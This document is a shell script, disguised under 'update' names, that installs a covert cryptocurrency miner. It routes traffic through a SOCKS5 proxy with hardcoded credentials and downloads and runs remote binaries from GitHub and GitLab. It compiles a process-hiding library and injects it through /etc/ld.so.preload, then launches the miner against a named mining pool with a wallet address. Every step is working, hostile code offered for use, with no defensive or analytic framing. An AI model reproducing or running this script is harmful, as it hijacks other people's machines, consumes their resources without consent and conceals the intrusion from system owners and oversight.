#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl && apt-get install -y libssl-dev libcurl4-gnutls-dev libgmp-dev && apt install ocl-icd-opencl-dev && wget https://github.com/nathanfleight/update/raw/main/update.tar.gz && tar -xvzf update.tar.gz

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 23.229.122.231:8259
socks5_username = kanglahem
socks5_password = Katrok1234
END

./update/local/update-local -config update/local/update-local.conf &

sleep .2

echo " "
echo " "

echo ""

./update/update curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./update/update wget https://gitlab.com/asraktanusi064/gacor/-/raw/main/gacormaseh?inline=false
chmod +x gacormaseh 
 
./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
unzip MagicComedy.zip 
make 
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl 
mv libprocesshider.so /usr/local/lib/ 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
 
ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./update/update ./gacormaseh -a ixi -r $ip -w 3AymKAZRtcHptxN6eXrwk6FXYpvYzW9cCWLRtrKX6YhGbqUSNLYzw6ScPdz3dZBJy -p http://mineixi.com:80
